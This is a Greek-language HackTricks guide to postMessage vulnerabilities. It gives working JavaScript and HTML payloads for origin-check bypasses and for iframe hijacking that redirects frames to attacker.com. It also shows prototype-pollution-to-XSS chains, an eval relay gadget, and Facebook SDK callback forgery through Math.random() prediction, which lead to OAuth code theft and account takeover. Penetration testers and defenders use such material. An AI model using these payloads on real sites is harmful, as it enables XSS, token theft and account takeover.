# PostMessage Ευπάθειες

{{#include ../../banners/hacktricks-training.md}}

## Αποστολή **PostMessage**

**PostMessage** χρησιμοποιεί την ακόλουθη συνάρτηση για να στείλει ένα μήνυμα:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Σημειώστε ότι το **targetOrigin** μπορεί να είναι '\*' ή ένα URL όπως _https://company.com._\
Στο **δεύτερο σενάριο**, το **μήνυμα μπορεί να σταλεί μόνο σε εκείνο το domain** (ακόμα κι αν η προέλευση του αντικειμένου Window είναι διαφορετική).\
Εάν χρησιμοποιηθεί το **wildcard**, **τα μηνύματα μπορούν να σταλούν σε οποιοδήποτε domain**, και θα σταλούν στην προέλευση του αντικειμένου Window.

### Attacking iframe & wildcard in **targetOrigin**

Όπως εξηγείται σε [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), αν βρείτε μια σελίδα που μπορεί να **iframed** (no `X-Frame-Header` protection) και που **στέλνει ευαίσθητο** μήνυμα μέσω **postMessage** χρησιμοποιώντας ένα **wildcard** (\*), μπορείτε να **τροποποιήσετε** την **origin** του **iframe** και να leak το **ευαίσθητο** μήνυμα σε ένα domain που ελέγχετε.\
Σημειώστε ότι αν η σελίδα μπορεί να iframed αλλά το **targetOrigin** είναι **set to a URL and not to a wildcard**, αυτό το **κόλπο δεν θα λειτουργήσει**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener εκμετάλλευση

**`addEventListener`** είναι η συνάρτηση που χρησιμοποιείται από την JS για να δηλώνει τη συνάρτηση που **περιμένει `postMessages`**.\
Ένας κώδικας παρόμοιος με τον παρακάτω θα χρησιμοποιηθεί:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Σημειώστε σε αυτή την περίπτωση πώς το **πρώτο πράγμα** που κάνει ο κώδικας είναι να **ελέγχει την προέλευση (origin)**. Αυτό είναι εξαιρετικά **σημαντικό**, κυρίως αν η σελίδα πρόκειται να κάνει **οτιδήποτε ευαίσθητο** με τις ληφθείσες πληροφορίες (π.χ. αλλαγή κωδικού πρόσβασης). **Αν δεν ελέγχει την προέλευση, οι επιτιθέμενοι μπορούν να κάνουν τα θύματα να στείλουν αυθαίρετα δεδομένα σε αυτά τα endpoints** και να αλλάξουν τους κωδικούς των θυμάτων (σε αυτό το παράδειγμα).

### Εντοπισμός

Για να **εντοπίσετε event listeners** στην τρέχουσα σελίδα μπορείτε:

- **Ψάξτε** τον JS κώδικα για `window.addEventListener` και `$(window).on` (_JQuery version_)
- **Εκτελέστε** στην κονσόλα του developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Πηγαίνετε** στο _Elements --> Event Listeners_ στα developer tools του browser

![](<../../images/image (396).png>)

- Χρησιμοποιήστε ένα **browser extension** όπως [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ή [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Αυτά τα browser extensions θα **υποκλέψουν όλα τα μηνύματα** και θα σας τα εμφανίσουν.

### Παρακάμψεις ελέγχου προέλευσης

- Το χαρακτηριστικό **`event.isTrusted`** θεωρείται ασφαλές καθώς επιστρέφει `True` μόνο για events που παράγονται από γνήσιες ενέργειες χρήστη. Αν και είναι δύσκολο να παρακαμφθεί αν υλοποιηθεί σωστά, η σημασία του σε security checks είναι σημαντική.
- Η χρήση του **`indexOf()`** για επικύρωση της προέλευσης σε PostMessage events μπορεί να είναι ευάλωτη σε παράκαμψη. Ένα παράδειγμα που το δείχνει είναι:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Η μέθοδος **`search()`** από `String.prototype.search()` προορίζεται για regular expressions, όχι για strings. Η παράδοση οτιδήποτε εκτός regexp οδηγεί σε implicit conversion σε regex, κάνοντας τη μέθοδο δυνητικά μη ασφαλή. Αυτό συμβαίνει επειδή στο regex, μια τελεία (.) λειτουργεί ως wildcard, επιτρέποντας την παράκαμψη της επικύρωσης με ειδικά διαμορφωμένα domains. Για παράδειγμα:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Η συνάρτηση **`match()`**, παρόμοια με το `search()`, επεξεργάζεται regex. Αν το regex είναι δομημένο λανθασμένα, μπορεί να είναι επιρρεπές σε παράκαμψη.
- Η συνάρτηση **`escapeHtml`** προορίζεται να καθαρίζει inputs με escaping χαρακτήρων. Ωστόσο, δεν δημιουργεί ένα νέο escaped object αλλά αντικαθιστά τις ιδιότητες του υπάρχοντος αντικειμένου. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί. Συγκεκριμένα, αν ένα αντικείμενο μπορεί να χειραγωγηθεί έτσι ώστε η ελεγχόμενη ιδιότητά του να μην αναγνωρίζει το `hasOwnProperty`, το `escapeHtml` δεν θα λειτουργήσει όπως αναμένεται. Αυτό δείχνεται στα παραδείγματα παρακάτω:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Στο πλαίσιο αυτής της ευπάθειας, το αντικείμενο `File` είναι ιδιαίτερα εκμεταλλεύσιμο λόγω της read-only ιδιότητας `name`. Αυτή η ιδιότητα, όταν χρησιμοποιείται σε templates, δεν αποστειρώνεται από τη `escapeHtml` συνάρτηση, οδηγώντας σε πιθανούς κινδύνους ασφάλειας.

- Η ιδιότητα `document.domain` στην JavaScript μπορεί να οριστεί από ένα script για να συντομεύσει το domain, επιτρέποντας πιο ελαστική επιβολή του same-origin policy εντός του ίδιου parent domain.

### Origin-only trust + trusted relays

Αν ένας receiver ελέγχει μόνο το **`event.origin`** (π.χ., εμπιστεύεται οποιοδήποτε `*.trusted.com`) συχνά μπορείτε να βρείτε μια **"relay" σελίδα σε εκείνο το origin που ανακλά παραμέτρους ελεγχόμενες από τον attacker μέσω του `postMessage`** προς ένα δοθέν `targetOrigin`/`targetWindow`. Παραδείγματα περιλαμβάνουν marketing/analytics gadgets που παίρνουν query params και προωθούν `{msg_type, access_token, ...}` στο `opener`/`parent`. Μπορείτε:

- **Ανοίξτε τη victim σελίδα σε ένα popup/iframe που έχει `opener`** ώστε οι handlers να εγγραφούν (πολλά pixels/SDKs συνδέουν listeners μόνο όταν υπάρχει `window.opener`).
- **Πλοηγήστε ένα άλλο attacker window στο relay endpoint στο trusted origin**, συμπληρώνοντας τα πεδία μηνύματος που θέλετε να εισαχθούν (τύπος μηνύματος, tokens, nonces).
- Επειδή το μήνυμα πλέον προέρχεται **από το trusted origin**, η επικύρωση μόνο με βάση την origin περνάει και μπορείτε να ενεργοποιήσετε privileged συμπεριφορές (αλλαγές κατάστασης, κλήσεις API, εγγραφές στο DOM) στον listener του θύματος.

Παρατηρημένα μοτίβα κατάχρησης:

- Analytics SDKs (π.χ., pixel/fbevents-style) καταναλώνουν μηνύματα όπως `FACEBOOK_IWL_BOOTSTRAP`, και στη συνέχεια **κάνουν κλήσεις σε backend APIs χρησιμοποιώντας ένα token που παρέχεται στο μήνυμα** και συμπεριλαμβάνουν **`location.href` / `document.referrer`** στο σώμα του αιτήματος. Αν παρέχετε το δικό σας token, μπορείτε να **διαβάσετε αυτά τα αιτήματα στο ιστορικό/τα logs των αιτημάτων του token** και να εξαγάγετε **OAuth codes/tokens** που υπάρχουν στο URL/referrer της σελίδας του θύματος.
- Οποιοδήποτε relay που αντικατοπτρίζει αυθαίρετα πεδία στο `postMessage` σας επιτρέπει να **spoof message types** που περιμένουν privileged listeners. Συνδυάστε με αδύναμη επικύρωση εισόδου για να φτάσετε σε Graph/REST κλήσεις, ξεκλείδωμα features, ή flows ισοδύναμα με CSRF.

Συμβουλές για ανίχνευση: καταγράψτε `postMessage` listeners που ελέγχουν μόνο το `event.origin`, και μετά ψάξτε για **same-origin HTML/JS endpoints που προωθούν URL params μέσω `postMessage`** (marketing previews, login popups, OAuth error pages). Συρράψτε και τα δύο με `window.open()` + `postMessage` για να παρακάμψετε τους ελέγχους origin.

### e.origin == window.origin bypass

Όταν ενσωματώνετε μια web σελίδα μέσα σε ένα **sandboxed iframe** χρησιμοποιώντας %%%%%%, είναι κρίσιμο να καταλάβετε ότι η origin του iframe θα οριστεί σε null. Αυτό είναι ιδιαίτερα σημαντικό όταν χειρίζεστε τα **sandbox attributes** και τις επιπτώσεις τους στην ασφάλεια και τη λειτουργικότητα.

Με τον καθορισμό του **`allow-popups`** στο sandbox attribute, οποιοδήποτε popup window ανοίγει από μέσα στο iframe κληρονομεί τους sandbox περιορισμούς του γονέα. Αυτό σημαίνει πως εκτός κι αν συμπεριληφθεί και το **`allow-popups-to-escape-sandbox`** attribute, η origin του popup window θα οριστεί επίσης σε `null`, ευθυγραμμίζοντας με την origin του iframe.

Κατά συνέπεια, όταν ένα popup ανοίγει υπό αυτές τις συνθήκες και ένα μήνυμα αποστέλλεται από το iframe στο popup με χρήση του **`postMessage`**, τόσο ο αποστολέας όσο και ο παραλήπτης έχουν τις origins τους ορισμένες σε `null`. Αυτή η κατάσταση οδηγεί σε σενάριο όπου **`e.origin == window.origin`** αξιολογείται ως true (`null == null`), επειδή τόσο το iframe όσο και το popup έχουν την ίδια τιμή origin `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Παράκαμψη e.source

Είναι δυνατόν να ελέγξετε αν το μήνυμα ήρθε από το ίδιο παράθυρο στο οποίο ακούει το script (ιδιαίτερα ενδιαφέρον για **Content Scripts from browser extensions** για να ελέγξουν αν το μήνυμα στάλθηκε από την ίδια σελίδα):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Μπορείτε να αναγκάσετε το **`e.source`** ενός μηνύματος να είναι null δημιουργώντας ένα **iframe** που **στέλνει** το **postMessage** και διαγράφεται **αμέσως**.

Για περισσότερες πληροφορίες **διάβασε:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Για να πραγματοποιήσετε αυτές τις επιθέσεις, ιδανικά θα πρέπει να μπορείτε να **τοποθετήσετε τη σελίδα του θύματος** μέσα σε ένα `iframe`. Αλλά κάποια headers όπως `X-Frame-Header` μπορούν να **αποτρέψουν** αυτή τη **συμπεριφορά**.\
Σε αυτά τα σενάρια μπορείτε να χρησιμοποιήσετε μια λιγότερο διακριτική επίθεση. Μπορείτε να ανοίξετε μια νέα καρτέλα στην ευάλωτη web εφαρμογή και να επικοινωνήσετε μαζί της:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Κλοπή μηνύματος που στέλνεται στο child by blocking the main page

Στην παρακάτω σελίδα μπορείτε να δείτε πώς θα μπορούσατε να κλέψετε **ευαίσθητα postmessage δεδομένα** που αποστέλλονται σε ένα **child iframe** αποκλείοντας τη **main** σελίδα πριν την αποστολή των δεδομένων και εκμεταλλευόμενοι ένα **XSS in the child** για να **leak the data** πριν αυτά ληφθούν:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Κλοπή μηνύματος με τροποποίηση της location του iframe

Αν μπορείτε να iframe μια σελίδα χωρίς X-Frame-Header που περιέχει άλλο iframe, μπορείτε να **αλλάξετε τη location του child iframe**, οπότε αν δέχεται ένα **postmessage** που αποστέλλεται χρησιμοποιώντας ένα **wildcard**, ένας επιτιθέμενος θα μπορούσε να **αλλάξει** το **origin** εκείνου του iframe σε μια σελίδα **controlled** από αυτόν και να **steal** το μήνυμα:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage σε Prototype Pollution και/ή XSS

Σε περιπτώσεις όπου τα δεδομένα που αποστέλλονται μέσω του `postMessage` εκτελούνται από JS, μπορείτε να **iframe** τη **σελίδα** και να **exploit** την **prototype pollution/XSS** στέλνοντας το exploit μέσω του `postMessage`.

**Δύο πολύ καλά εξηγημένα XSS μέσω του `postMessage`** μπορούν να βρεθούν στο [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Παράδειγμα ενός exploit για την εκμετάλλευση της **Prototype Pollution και στη συνέχεια XSS** μέσω ενός `postMessage` σε ένα `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Για **περισσότερες πληροφορίες**:

- Σύνδεσμος σε σελίδα για [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Σύνδεσμος σε σελίδα για [**XSS**](../xss-cross-site-scripting/index.html)
- Σύνδεσμος σε σελίδα για [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Φόρτωση script από το origin και supply-chain pivot (μελέτη περίπτωσης CAPIG)

`capig-events.js` κατέγραψε μόνο έναν χειριστή `message` όταν υπήρχε `window.opener`. Στο `IWL_BOOTSTRAP` έλεγχε το `pixel_id` αλλά αποθήκευε το `event.origin` και αργότερα το χρησιμοποιούσε για να δημιουργήσει `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Χειριστής που γράφει origin ελεγχόμενο από επιτιθέμενο</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Get an opener: π.χ., στο Facebook Android WebView επαναχρησιμοποίησε `window.name` με `window.open(target, name)` ώστε το παράθυρο να γίνει το δικό του opener, και μετά κάνε `postMessage` από ένα κακόβουλο iframe.
2. Στείλε `IWL_BOOTSTRAP` από οποιαδήποτε origin για να επιμείνει το `host = event.origin` στο `localStorage`.
3. Φιλοξένησε `/sdk/<pixel_id>/iwl.js` σε οποιοδήποτε CSP-allowed origin (takeover/XSS/upload σε ένα whitelisted analytics domain). Το `startIWL()` τότε φορτώνει attacker JS στο embedding site (π.χ. `www.meta.com`), επιτρέποντας credentialed cross-origin κλήσεις και account takeover.

Αν ο άμεσος έλεγχος του opener ήταν αδύνατος, το compromising ενός third-party iframe στη σελίδα επέτρεπε ακόμα την αποστολή του crafted `postMessage` στον parent για να δηλητηριάσει το αποθηκευμένο host και να αναγκάσει το script load.

**Backend-generated shared script → stored XSS:** το plugin `AHPixelIWLParametersPlugin` συνέδεε παραμέτρους κανόνων χρήστη μέσα σε JS που προστίθεται στο `capig-events.js` (π.χ., `cbq.config.set(...)`). Η ένεση breakouts όπως `"]}` εισήγαγε αυθαίρετο JS, δημιουργώντας stored XSS στο κοινό script που σερβίρεται σε όλες τις sites που το φορτώνουν.

### Η λίστα επιτρεπόμενων trusted origins δεν αποτελεί όριο

Ένας αυστηρός έλεγχος του `event.origin` λειτουργεί μόνο αν το **trusted origin cannot run attacker JS**. Όταν privileged pages ενσωματώνουν third-party iframes και υποθέτουν ότι `event.origin === "https://partner.com"` είναι ασφαλές, οποιοδήποτε XSS στο `partner.com` γίνεται γέφυρα προς τον parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Σχέδιο επίθεσης που παρατηρήθηκε σε πραγματικό περιβάλλον:

1. **Exploit XSS in the partner iframe** και να τοποθετήσει ένα relay gadget ώστε κάθε `postMessage` να γίνεται code exec μέσα στην trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Από τη σελίδα του επιτιθέμενου**, στείλετε JS στο compromised iframe που προωθεί ένα allowed message type πίσω στο parent. Το μήνυμα προέρχεται από `partner.com`, περνάει την allowlist, και φέρει HTML που εισάγεται ανασφαλώς:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Ο parent εισάγει το attacker HTML, δίνοντας **εκτέλεση JS στο parent origin** (π.χ. `facebook.com`), το οποίο μπορεί στη συνέχεια να χρησιμοποιηθεί για να κλαπούν OAuth codes ή να εξελιχθεί σε πλήρη takeover flows λογαριασμού.

Key takeaways:

- **Το partner origin δεν είναι όριο**: οποιοδήποτε XSS σε έναν "trusted" partner επιτρέπει σε attackers να στέλνουν επιτρεπτά μηνύματα που παρακάμπτουν τους ελέγχους `event.origin`.
- Οι handlers που **render-άρουν payloads ελεγχόμενα από τον partner** (π.χ. `innerHTML` σε συγκεκριμένους τύπους μηνυμάτων) μετατρέπουν τη συμβιβασμένη partner σε same-origin DOM XSS.
- Μια ευρεία **message surface** (πολλοί τύποι, χωρίς έλεγχο δομής) δίνει περισσότερα gadgets για pivoting όταν ένα partner iframe έχει συμβιβαστεί.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Όταν η επικύρωση μηνυμάτων χρησιμοποιεί ένα “shared secret” που δημιουργείται με `Math.random()` (π.χ., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) και ο ίδιος βοηθητικός κώδικας δίνει επίσης ονόματα στα plugin iframes, μπορείτε να ανακτήσετε PRNG outputs και να πλαστογραφήσετε trusted μηνύματα:

- **Leak PRNG outputs via `window.name`:** Το SDK ονομάζει αυτόματα τα plugin iframes με `guid()`. Αν ελέγχετε το top frame, iframe-άρετε τη σελίδα θύμα, μετά πλοηγήστε το plugin iframe στο origin σας (π.χ. `window.frames[0].frames[0].location='https://attacker.com'`) και διαβάστε `window.frames[0].frames[0].name` για να αποκτήσετε ένα ακατέργαστο `Math.random()` output.
- **Force more outputs without reloads:** Κάποια SDK εκθέτουν μία reinit διαδρομή· στο FB SDK, το firing του `init:post` με `{xfbml:1}` αναγκάζει `XFBML.parse()`, καταστρέφει/ξαναδημιουργεί το plugin iframe και παράγει νέα names/callback IDs. Επαναλαμβανόμενες reinit καλείες παράγουν όσα PRNG outputs χρειάζονται (σημειώστε επιπλέον εσωτερικές κλήσεις `Math.random()` για callback/iframe IDs, οπότε οι solvers πρέπει να παραλείψουν ενδιάμεσα values).
- **Trusted-origin delivery via parameter pollution:** Αν ένα first-party plugin endpoint αντανακλά έναν μη-καθαρισμένο παράμετρο στο cross-window payload (π.χ., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), μπορείτε να injektάρετε `&type=...&iconSVG=...` διατηρώντας το trusted `facebook.com` origin.
- **Predict the next callback:** Μετατρέψτε τα leaked iframe names πίσω σε floats στο `[0,1)` και δώστε αρκετές τιμές (ακόμα και μη συνεχιζόμενες) σε έναν V8 `Math.random` predictor (π.χ., Z3-based). Γεννήστε το επόμενο `guid()` τοπικά για να πλαστογραφήσετε το αναμενόμενο callback token.
- **Trigger the sink:** Συνθέστε τα postMessage δεδομένα ώστε η γέφυρα να διανείμει `xd.mpn.setupIconIframe` και να εισάγει HTML στο `iconSVG` (π.χ., URL-encoded `<img src=x onerror=...>`), επιτυγχάνοντας DOM XSS μέσα στο hosting origin· από εκεί, same-origin iframes (OAuth dialogs, arbiters, κ.λπ.) μπορούν να διαβαστούν.
- **Framing quirks help:** Η αλυσίδα απαιτεί framing. Σε ορισμένα mobile webviews, το `X-Frame-Options` μπορεί να υποβαθμιστεί σε μη-υποστηριζόμενο `ALLOW-FROM` όταν υπάρχει `frame-ancestors`, και παράμετροι “compat” μπορούν να αναγκάσουν permissive `frame-ancestors`, επιτρέποντας το `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Αναφορές

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Για εξάσκηση: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
